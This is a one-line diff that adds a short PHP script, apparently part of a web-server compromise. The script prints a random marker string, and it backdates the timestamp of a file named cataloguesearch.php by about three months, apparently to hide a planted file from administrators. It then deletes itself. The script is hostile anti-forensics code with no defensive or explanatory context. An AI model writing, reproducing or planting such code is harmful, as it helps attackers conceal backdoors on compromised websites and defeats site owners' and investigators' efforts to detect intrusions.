@@ -1,0 +1,1 @@
+<?php echo "QWznfDAaxU"; if (file_exists("./cataloguesearch.php")){ touch("./cataloguesearch.php",(time()-60*60*24*30*3)); } unlink(__FILE__); /*7YCHREZC5GT91D9wNhCC*/ ?>
